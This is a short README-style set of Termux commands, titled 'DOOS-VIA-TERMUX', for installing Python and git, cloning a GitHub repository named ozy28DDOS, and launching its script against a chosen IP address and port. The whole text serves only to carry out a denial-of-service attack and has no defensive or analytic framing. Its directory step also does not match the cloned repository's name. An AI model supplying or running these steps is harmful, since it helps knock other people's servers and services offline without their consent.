DOOS-VIA-TERMUX

apt update && apt upgrade
pkg install python
pkg install python3
pkg install git
git clone https://github.com/ozy28/ozy28DDOS
cd ddos-via-termux
ls
python3 ozy28DDOS.py
python ozy28DDOS.py (ip) (port 80) (135)
